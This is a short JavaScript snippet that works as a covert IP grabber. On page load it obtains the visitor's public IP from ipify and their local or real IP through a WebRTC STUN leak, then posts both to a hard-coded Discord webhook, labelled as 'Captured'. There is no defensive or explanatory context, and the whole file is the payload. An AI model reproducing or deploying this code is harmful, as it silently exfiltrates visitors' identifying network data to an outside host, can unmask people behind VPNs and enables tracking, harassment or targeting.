`const WEBHOOK_URL = "https://discord.com/api/webhooks/1498101013809332416/BgXiCf3WAVsC-ejsvT7mAof1SWTMUh0ONTNQXYlNHqTKMUIFcMGJj5WqIExDHPM44-z1";

async function sendToDiscord(data, type) {
    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: "Captured " + type + ": " + data
        })
    });
}

async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        sendToDiscord(data.ip, "Public IP (Ipify)");
    } catch (e) {}
}

function getWebRTCIP() {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pc.createDataChannel("");
    pc.createOffer().then(o => pc.setLocalDescription(o));
    pc.onicecandidate = (e) => {
        if (!e || !e.candidate) return;
        const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
        sendToDiscord(ip, "Real IP (WebRTC)");
    };
}

window.onload = () => {
    getPublicIP();
    getWebRTCIP();
}; `